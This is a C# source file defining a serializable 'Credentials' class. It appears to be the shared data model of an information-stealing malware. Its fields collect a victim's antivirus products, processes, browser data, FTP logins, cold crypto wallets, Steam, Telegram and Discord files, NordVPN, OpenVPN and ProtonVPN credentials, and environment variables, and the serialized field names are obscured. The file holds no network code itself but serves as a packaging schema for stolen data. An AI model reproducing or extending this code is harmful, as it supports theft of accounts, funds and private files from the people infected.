using ProtoBuf;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace Meta.SharedModels;

[DataContract(Name = "FieldRoot1", Namespace = "exampleNs")]
[ProtoContract(Name = "Credentials")]
public class Credentials
{
    [ProtoMember(1, Name = "Defenders")]
    [DataMember(Name = "Field1")]
    public IList<string> Defenders { get; set; }

    [ProtoMember(2, Name = "Languages")]
    [DataMember(Name = "Field2")]
    public IList<string> Languages { get; set; }

    [ProtoMember(3, Name = "InstalledSoftwares")]
    [DataMember(Name = "Field3")]
    public IList<string> InstalledSoftwares { get; set; }

    [DataMember(Name = "Field4")]
    [ProtoMember(4, Name = "Processes")]
    public IList<string> Processes { get; set; }

    [DataMember(Name = "Field5")]
    [ProtoMember(5, Name = "Hardwares")]
    public IList<Hardware> Hardwares { get; set; }

    [ProtoMember(6, Name = "Browsers")]
    [DataMember(Name = "Field6")]
    public IList<Browser> Browsers { get; set; }

    [ProtoMember(7, Name = "FtpConnections")]
    [DataMember(Name = "Field7")]
    public IList<LoginPair> FtpConnections { get; set; }

    [ProtoMember(8, Name = "InstalledBrowsers")]
    [DataMember(Name = "Field8")]
    public IList<InstalledBrowserInfo> InstalledBrowsers { get; set; }

    [DataMember(Name = "Field9")]
    [ProtoMember(9, Name = "Files")]
    public IList<RemoteFile> Files { get; set; }

    [DataMember(Name = "Field10")]
    [ProtoMember(12, Name = "SteamFiles")]
    public IList<RemoteFile> SteamFiles { get; set; }

    [ProtoMember(10, Name = "ColdWallets")]
    [DataMember(Name = "Field11")]
    public IList<RemoteFile> ColdWallets { get; set; }

    [ProtoMember(13, Name = "NordVPN")]
    [DataMember(Name = "Field12")]
    public IList<LoginPair> NordVPN { get; set; }

    [DataMember(Name = "Field13")]
    [ProtoMember(14, Name = "OpenVPN")]
    public IList<RemoteFile> OpenVPN { get; set; }

    [ProtoMember(15, Name = "ProtonVPN")]
    [DataMember(Name = "Field14")]
    public IList<RemoteFile> ProtonVPN { get; set; }

    [DataMember(Name = "Field15")]
    [ProtoMember(16, Name = "TelegramFiles")]
    public IList<RemoteFile> TelegramFiles { get; set; }

    [DataMember(Name = "Field16")]
    [ProtoMember(17, Name = "Discord")]
    public IList<RemoteFile> Discord { get; set; }

    [ProtoMember(18, Name = "Id17")]
    [DataMember(Name = "Field17")]
    public IList<string> DebugInfo { get; set; }

    [DataMember(Name = "Field18")]
    [ProtoMember(19, Name = "SystemEnvironments")]
    public Dictionary<string, string> SystemEnvironments { get; set; }
}
